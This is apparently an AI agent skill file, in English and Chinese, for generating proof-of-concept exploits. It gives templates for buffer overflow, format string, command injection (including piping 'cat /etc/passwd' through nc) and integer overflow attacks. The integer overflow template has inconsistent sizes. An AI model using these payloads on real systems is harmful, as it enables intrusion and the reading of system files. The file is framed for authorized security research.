---
name: binary-poc-generator
description: Use when generating proof-of-concept exploits for confirmed binary vulnerabilities. Triggers: "generate PoC", "create exploit", "write PoC", after vuln-audit confirms vulnerability. Produces executable Python/C/Bash PoCs with detailed instructions.
---

# Binary PoC Generator / 二进制 PoC 生成器

## Overview / 概述

Generates executable proof-of-concept exploits for confirmed binary vulnerabilities.
为确认的二进制漏洞生成可执行的漏洞利用概念验证。

## When to Use / 使用场景

Use this skill when:
- User says "generate PoC", "create exploit", "write PoC"
- After vuln-audit confirms vulnerability
- Need to demonstrate exploitability
- Testing vulnerability remediation

## PoC by Vulnerability Type / 按漏洞类型的 PoC

### Buffer Overflow / 缓冲区溢出

**Languages:** Python, C

**Python PoC Template:**
```python
#!/usr/bin/env python3
"""
PoC for Buffer Overflow in [function_name]
Vulnerability: [operation] without bounds checking
Impact: [overflow description]
"""

import socket
import sys

def exploit_buffer_overflow(target_host, target_port):
    """
    Exploit buffer overflow by sending oversized payload
    """
    # Calculate payload size
    buffer_size = 64  # From analysis
    payload_size = buffer_size + 200  # Overflow by 200 bytes

    # Construct payload
    payload = b"A" * payload_size

    # Connect and send
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_host, target_port))
        sock.send(payload)

        print(f"[+] Payload sent ({payload_size} bytes)")
        print("[+] Check target for crash/shell")
        sock.close()
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        sys.exit(1)

    exploit_buffer_overflow(sys.argv[1], int(sys.argv[2]))
```

**C PoC Template:**
```c
/*
 * PoC for Buffer Overflow in [function_name]
 * Compile: gcc -o poc_bof poc_bof.c
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vulnerable_function(char *input) {
    char buffer[64];
    // VULNERABILITY: No bounds checking
    strcpy(buffer, input);
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <payload>\n", argv[0]);
        return 1;
    }

    printf("Sending payload...\n");
    vulnerable_function(argv[1]);

    return 0;
}
```

### Format String / 格式化字符串

**Languages:** Python

**Python PoC Template:**
```python
#!/usr/bin/env python3
"""
PoC for Format String Vulnerability in [function_name]
Vulnerability: User input controls format parameter
Impact: Read/write arbitrary memory, execute code
"""

import socket

def exploit_format_string(target_host, target_port):
    """
    Exploit format string by sending format specifiers
    """
    # Format string to leak memory
    format_string = b"AAAA%p.%p.%p.%p.%p.%p"

    # Connect and send
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_host, target_port))
    sock.send(format_string)

    # Receive response
    response = sock.recv(1024)
    print("[+] Response:")
    print(response.decode())

    # Parse leaked memory addresses
    # ...

    sock.close()

if __name__ == "__main__":
    exploit_format_string("192.168.1.1", 80)
```

### Command Injection / 命令注入

**Languages:** Python, Bash

**Python PoC Template:**
```python
#!/usr/bin/env python3
"""
PoC for Command Injection in [function_name]
Vulnerability: User input reaches shell command
Impact: Remote code execution
"""

import socket

def exploit_command_injection(target_host, target_port, command):
    """
    Inject command by appending to user input
    """
    # Payload: command + shell metacharacter + injected command
    payload = f"normal_input; {command}".encode()

    # Connect and send
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_host, target_port))
    sock.send(payload)

    # Receive command output
    response = sock.recv(4096)
    print("[+] Command output:")
    print(response.decode())

    sock.close()

if __name__ == "__main__":
    # Execute 'id' command on target
    exploit_command_injection("192.168.1.1", 80, "id")
```

**Bash PoC Template:**
```bash
#!/bin/bash
# PoC for Command Injection in [function_name]
# Vulnerability: User input reaches system()

TARGET_HOST="192.168.1.1"
TARGET_PORT=80

# Payload: normal input + command injection
PAYLOAD="normal_input; cat /etc/passwd"

# Send payload
echo "Sending command injection payload..."
echo "$PAYLOAD" | nc $TARGET_HOST $TARGET_PORT

echo ""
echo "If vulnerable, /etc/passwd will be displayed"
```

### Integer Overflow / 整数溢出

**Languages:** C

**C PoC Template:**
```c
/*
 * PoC for Integer Overflow in [function_name]
 * Vulnerability: Integer arithmetic overflow bypasses bounds check
 * Impact: Buffer overflow, heap corruption
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void vulnerable_allocation(uint32_t size) {
    // VULNERABILITY: Integer overflow
    // If size = 0x100000001, becomes 0x1 after overflow
    char *buffer = (char *)malloc(size);

    if (buffer == NULL) {
        printf("Allocation failed\n");
        return;
    }

    // Overflow allows writing beyond allocated size
    memset(buffer, 0x41, 0x100000000);  // 4GB overwrite
    printf("Buffer overflowed!\n");

    free(buffer);
}

int main() {
    // Trigger integer overflow
    vulnerable_allocation(0x100000001);

    return 0;
}
```

## PoC Generation Process / PoC 生成过程

### Step 1: Extract Vulnerability Details / 步骤 1：提取漏洞详情

```python
vuln = {
    "type": "buffer_overflow",
    "function": "process_input",
    "source": "recv",
    "sink": "strcpy",
    "buffer_size": 64,
    "overflow_amount": 200,
    "location": "process_input:0x4012a5"
}
```

### Step 2: Select Appropriate Template / 步骤 2：选择合适模板

Based on vulnerability type, choose template.

### Step 3: Fill in Details / 步骤 3：填充详情

Replace template placeholders with actual vulnerability data.

### Step 4: Add Exploitation Details / 步骤 4：添加利用详情

Include:
- Payload calculation
- Target connection details
- Expected behavior
- Verification steps

### Step 5: Test and Validate / 步骤 5：测试和验证

Ensure PoC:
- Compiles without errors
- Runs without crashing (before exploitation)
- Successfully triggers vulnerability

## PoC Requirements / PoC 要求

Every PoC MUST include:
每个 PoC 必须包括：

1. **Executable Code** - Complete, runnable program
2. **Detailed Comments** - Explain vulnerability and exploitation
3. **Usage Instructions** - How to run the PoC
4. **Expected Behavior** - What happens when successful
5. **Target Information** - Host, port, or binary path

## PoC Output Structure / PoC 输出结构

```
pocs/
├── buffer_overflow_poc.py
├── format_string_poc.py
├── cmd_injection_poc.py
└── integer_overflow_poc.c
```

## Safety and Ethics / 安全和道德

**WARNING:** PoCs are for defensive security research only.
**警告：** PoC 仅用于防御性安全研究。

- ✅ Test on systems you own or have permission to test
- ✅ Use for vulnerability demonstration
- ✅ Use for remediation testing
- ❌ Do NOT use for malicious purposes
- ❌ Do NOT use on systems without permission

## Example / 示例

```
User: "Generate a PoC for the buffer overflow in process_input"
Agent: [Uses binary-poc-generator]
       [Extracts vulnerability details]
       [Selects buffer overflow template]
       [Fills in: buffer_size=64, overflow=200]
       [Generates Python PoC]
Output: "PoC generated: pocs/buffer_overflow_poc.py
        Usage: python3 pocs/buffer_overflow_poc.py 192.168.1.1 8080"
```

## Integration / 集成

**Used by:**
- vuln-reporting (generates PoCs for report)

**Uses:**
- vuln-audit (gets confirmed vulnerability details)
- binary-analysis (gets architecture/format info)
